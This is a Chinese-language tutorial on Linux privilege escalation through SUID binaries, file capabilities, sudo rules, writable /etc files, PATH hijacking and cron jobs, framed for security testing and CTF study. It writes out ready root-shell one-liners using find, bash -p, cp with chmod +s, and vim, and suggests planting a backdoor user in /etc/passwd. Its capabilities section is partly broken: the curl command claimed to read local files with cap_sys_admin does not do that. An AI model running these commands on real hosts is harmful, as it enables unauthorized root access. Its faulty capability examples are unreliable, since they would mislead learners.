Linux 提权基础：SUID 与 Capabilities 详解

Linux 提权（Privilege Escalation）指在已经获得普通用户权限的前提下，把权限提升到 root 或更高。最常见的两类源头是 SUID 位滥用和 Capabilities 配置错误。本文只做原理与枚举方法整理，重点放在「如何发现可被利用的误配置」。

免责声明： 以下内容仅用于安全测试、CTF、自有环境加固学习。未经授权的提权尝试在现实中属于违法行为。

一、先搞清楚当前能做什么

拿到一个 shell 后，第一步永远是收集信息：

whoami; id
sudo -nl            # 查看当前用户有哪些 sudo 免密/可执行的命令
cat /etc/passwd | grep -v nologin
getcap -r / 2>/dev/null   # 带 Capabilities 的文件（root 时）

二、SUID 位：让普通用户以 root 身份运行程序

SUID（Set UID）是文件权限里的一个特殊位。当一个可执行文件设置了 SUID root，任何人运行它时，进程的有效 UID 都变成 root。这是设计上合法的机制（比如 passwd 需要改 root 属主的 /etc/shadow），但如果被保护程序内部存在漏洞，就是提权入口。

枚举 SUID 文件

find / -perm -4000 -type f 2>/dev/null
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

经典可被利用的 SUID 程序

程序风险
findfind . -exec /bin/sh \; 直接获得 root shell
bash / sh执行 bash -p，保留 SUID 得到 root shell
cp / dd用 cp /bin/sh /tmp/sh; chmod +s /tmp/sh 复制并加 SUID
vim:!/bin/sh 或 :!sh! 跳出获得 root shell

三、Capabilities：更细粒度的 root 权限拆分

Capabilities 是 Linux 把 root 的权限拆分成 30 多个独立能力（cap）。程序可以只持有某个能力而完全不需要是 root。配置错误的 Capabilities 同样是提权点。

常见可被利用的能力

# 枚举
getcap -r / 2>/dev/null
capsh --print   # 查看当前 shell 的 capabilities

# 持有 cap_sys_admin 的 curl：读取本地任意文件
curl --remote-name http://localhost:8080/x -w "%{url_effective}"

# 持有 cap_setuid 的程序可直接 setuid(0)

# 持有 cap_dac_read_search 的程序可读取任意文件

典型误配置

  • 业务容器逃逸：给容器内可写目录里的二进制加了 cap_sys_admin。
  • 把 cap_dac_read_search 挂在 cron 定期执行但可被普通用户替换的二进制上。
  • 调试遗留：开发阶段给某程序加了能力，上线前忘记去掉。

四、其他高频检查点

sudo 规则

sudo -nl
# 如果看到某可编辑的脚本或 find/nmap/vim 等被允许无密码执行，逐个判断：
#   sudo find . -exec /bin/sh \;
#   sudo vim /tmp/x.txt 然后 :!/bin/sh
#   sudo nmap --exec nse_script 等

可写的 /etc 与 PATH 劫持

ls -ld /etc/passwd /etc/shadow /etc
# 若 /etc/passwd 或 /etc/shadow 对普通用户可写，直接写入后门用户

# PATH 劫持：root 的 PATH 指向普通用户可写的目录且其中已有同名工具，
# 替换为恶意的 getcap/setuid 版本

Cron 任务

ls -la /etc/cron* /var/spool/cron/
# 若 cron 任务调用普通用户可写的脚本或二进制，替换内容即可以 root 执行

五、小结

提权排查的核心思路：先确认「当前用户能影响哪些 root 会执行的东西」。SUID 让普通调用变成 root 身份调用；Capabilities 给部分程序赋予了越权的细粒度能力；sudo 规则和 cron 决定了 root 会运行哪些脚本。把这三个方向枚举一遍，大多数环境里的高危点都能被快速定位。
